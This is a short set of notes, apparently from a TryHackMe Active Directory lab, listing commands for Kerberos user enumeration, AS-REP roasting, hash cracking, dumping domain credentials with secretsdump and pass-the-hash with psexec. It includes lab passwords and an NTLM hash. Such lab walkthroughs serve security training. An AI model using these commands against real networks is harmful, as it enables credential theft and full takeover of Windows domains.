### Enumeration
__User Enumeration__
```bash
kerbrute userenum --dc $IP -d THM-AD users.txt
```

---
### Exploitation
#### ASREPRoasting
It occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account *does not need to provide valid identification before requesting a Kerberos Ticket* on the specified user account.

```bash
GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip $IP
```

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt -O
```

```bash
smbclient -L //10.10.56.79/ -U spookysec.local/svc-admin --password=management2005
```

#### Dump  NTDS.DIT data via Backup account
```bash
secretsdump.py spookysec.local/backup:'backup2517860'@$IP -just-dc
```
#### Pass The Hash
```bash
psexec.py Administrator@10.10.157.4 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```




